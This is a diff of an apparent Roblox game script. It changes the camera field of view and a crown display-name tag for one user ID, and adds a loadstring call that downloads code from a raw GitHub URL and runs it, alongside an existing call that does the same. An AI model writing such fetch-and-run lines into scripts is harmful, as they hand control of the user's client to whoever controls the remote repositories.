@@ -119,6 +119,8 @@ local amount = 90
 
 game:GetService'Workspace'.Camera.FieldOfView = amount
 
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/adminsDHM"))()
+
 wait(.5)
 
 loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/nyulachan/nyula/main/nyuladhm"))()
@@ -127,7 +129,7 @@ game.Players.PlayerAdded:Connect(function(plr)
 	plr.CharacterAdded:Connect(function(Char)
 		Char:WaitForChild("Humanoid")
 		if plr.UserId == 528650746 then
-			Char.Humanoid.DisplayName = "[👑⭐️💎]" .. plr.DisplayName
+			Char.Humanoid.DisplayName = "[👑]" .. plr.DisplayName
         end
 	end)
 end)
